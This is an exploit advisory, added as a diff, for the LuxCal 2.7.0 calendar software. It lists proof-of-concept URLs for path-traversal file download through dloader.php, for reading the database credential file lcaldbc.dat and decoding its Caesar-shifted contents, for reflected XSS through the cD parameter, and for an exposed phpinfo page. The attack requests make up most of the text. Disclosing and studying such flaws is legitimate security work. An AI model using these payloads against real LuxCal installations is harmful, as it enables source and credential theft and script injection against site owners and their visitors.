@@ -1,0 +1,75 @@
+#################################################
+### Exploit Title: LuxCal v2.7.0 Multiple Remote Vulnerabilities
+### Date: 17/09/2012 
+### Author: L0n3ly-H34rT 
+### Contact: l0n3ly_h34rt@hotmail.com 
+### My Site: http://se3c.blogspot.com/ 
+### Vendor Link: http://www.luxsoft.eu/
+### Software Link: http://www.luxsoft.eu/dloader.php?file=luxcal270.zip
+### Version: 2.7.0
+### Tested on: Linux/Windows 
+#################################################
+
+1- Local File Inclusion :
+
+* P.O.C :
+
+http://127.0.0.1/luxcal270/dloader.php?fName=../index.php
+
+this is example for download the source of index script , you will see the source inside as name of affected file "dloader.php"
+
+2- Information Disclosure :
+
+* P.O.C :
+
+http://127.0.0.1/luxcal270/lcaldbc.dat
+
+- you will see the information of database but encrypte as Caesar cipher methode in shift 11 e.g. :
+
+LuxCal
+2.7.0
+p 5 {x 0;h 9 "adrpawdhi";x 1;h 4 "ajmm";x 2;h 4 "gddi";x 3;h 6 "000000";x 4;h 0 "";}
+
+- my information in database is :
+
+mysql server : localhost
+
+mysql username : root
+
+mysql password : 000000
+
+mysql database : luxx
+
+- when i install script all this name of information is encrypte and the word become as we see before in file "lcaldbc.dat" :
+
+mysql server : adrpawdhi
+
+mysql username : gddi
+
+mysql password : 000000
+
+mysql database : ajmm
+
+- you ask me how to decrypt that , you can decrypt by many ways but i give the easy way here :
+
+http://www.richkni.co.uk/php/crypta/caesar.php
+
+you can put your text and submit to decipher that word , then search in " Processed text - shift 11 "
+
+you will see your decrypted word ..
+
+3- XSS :
+
+* P.O.C :
+
+http://127.0.0.1/luxcal270/index.php?cD=[XSS]
+
+also some files is affected 
+
+4- phpinfo () :
+
+http://127.0.0.1/luxcal270/pages/phpinfo.php
+
+############################################
+
+# Greetz to my friendz
